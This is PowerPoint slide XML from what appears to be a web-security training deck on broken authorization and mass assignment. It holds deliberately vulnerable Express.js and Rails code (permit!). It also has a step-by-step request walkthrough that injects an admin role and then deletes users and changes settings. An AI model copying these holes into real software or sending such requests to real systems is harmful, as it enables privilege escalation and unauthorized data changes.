            <a:off x="3402449" y="797243"/>
            <a:ext cx="7825502" cy="136088"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The following Express.js code demonstrates a critical vulnerability where authentication is checked, but proper authorization is missing:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="997029"/>
            <a:ext cx="7825502" cy="2211348"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2154"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="997029"/>
            <a:ext cx="7836694" cy="2211348"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 769"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="1082040"/>
            <a:ext cx="7609999" cy="2041327"/>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Express.js - VULNERABLE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app.put('/api/users/:userId', authenticateUser, async (req, res) =&gt;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const userId = req.params.userId;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const updates = req.body;</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 Only checks if user is authenticated, not if they can modify this user</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if (req.user.id !== parseInt(userId))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return res.status(403).json({error: 'Forbidden'});</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 VULNERABLE: Allows updating ANY field including 'role'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await User.update(updates, { where: { id: userId }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res.json({message: 'User updated'});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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3293388"/>
            <a:ext cx="2381607" cy="297656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3676055"/>
            <a:ext cx="7825502" cy="136088"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The attack unfolds in four steps, demonstrating how a regular user can escalate their privileges to admin level:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3875842"/>
            <a:ext cx="113348" cy="141684"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="4053245"/>
            <a:ext cx="3884414" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="4140398"/>
            <a:ext cx="1520190" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Normal profile update</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="4390073"/>
            <a:ext cx="3884414" cy="1530906"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="4390073"/>
            <a:ext cx="3895606" cy="1530906"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="4475083"/>
            <a:ext cx="3668911" cy="1360884"/>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PUT /api/users/100</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Authorization: Bearer user_token</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Content-Type: application/json</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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"name": "John Doe",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"email": "john@example.com"</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a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Response: {"message": "User updated"}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="3875842"/>
            <a:ext cx="113348" cy="141684"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="4053245"/>
            <a:ext cx="3884414" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="4140398"/>
            <a:ext cx="1488519" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Inject admin role</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="4390073"/>
            <a:ext cx="3884414" cy="1666994"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2857"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7337941" y="4390073"/>
            <a:ext cx="3895606" cy="1666994"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1021"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7451288" y="4475083"/>
            <a:ext cx="3668911" cy="1496973"/>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PUT /api/users/100</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Authorization: Bearer user_token</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Content-Type: application/json</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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"name": "John Doe",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"email": "john@example.com",</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"role": "admin"  ← PRIVILEGE ESCALATION</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a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Response: {"message": "User updated"}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="6198751"/>
            <a:ext cx="113348" cy="141684"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="6376154"/>
            <a:ext cx="3884414" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="6463308"/>
            <a:ext cx="1488519" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Verify admin access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="6712982"/>
            <a:ext cx="3884414" cy="1666994"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2857"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="6712982"/>
            <a:ext cx="3895606" cy="1666994"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1021"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="6797993"/>
            <a:ext cx="3668911" cy="1496973"/>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Check current user info</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GET /api/users/me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Authorization: Bearer user_token</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Response: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"id": 100,</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"name": "John Doe",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"email": "john@example.com",</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"role": "admin"  ← SUCCESS!</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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="6198751"/>
            <a:ext cx="113348" cy="141684"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="6376154"/>
            <a:ext cx="3884414" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="6463308"/>
            <a:ext cx="1628299" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Access admin functions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="6712982"/>
            <a:ext cx="3884414" cy="2075259"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2295"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7337941" y="6735284"/>
            <a:ext cx="3895606" cy="2075259"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 820"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7451288" y="6797993"/>
            <a:ext cx="3668911" cy="1905238"/>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Delete any user</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DELETE /api/users/50</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Authorization: Bearer user_token</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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View all users</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GET /api/admin/users</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Authorization: Bearer user_token</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Modify site settings</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PUT /api/admin/settings</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Authorization: Bearer user_token</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"maintenanceMode": true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02449" y="1053465"/>
            <a:ext cx="4716899"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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>7.3 Mass Assignment Vulnerability</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1448157"/>
            <a:ext cx="3534013" cy="297656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Target: User Registration System</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1830824"/>
            <a:ext cx="7825502" cy="136088"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>This Ruby on Rails code demonstrates a dangerous mass assignment vulnerability where all parameters are accepted without filtering:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="2051923"/>
            <a:ext cx="2797493" cy="223242"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Registration Endpoint:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="2360176"/>
            <a:ext cx="7825502" cy="2891790"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1647"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="2360176"/>
            <a:ext cx="7836694" cy="2891790"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 588"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="2445187"/>
            <a:ext cx="7609999" cy="2721769"/>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Ruby on Rails - VULNERABLE CODE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class UsersController &lt; ApplicationController</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def create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 VULNERABLE: Accepts all parameters from request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@user = User.new(user_params)</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if @user.save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render json: { message: 'User created', user: @user }, status: :created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else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render json: { errors: @user.errors }, status: :unprocessable_entity</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end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end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private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def user_params</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 DANGEROUS: Permits all parameters</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params.require(:user).permit!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end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end</a:t>
            </a:r>
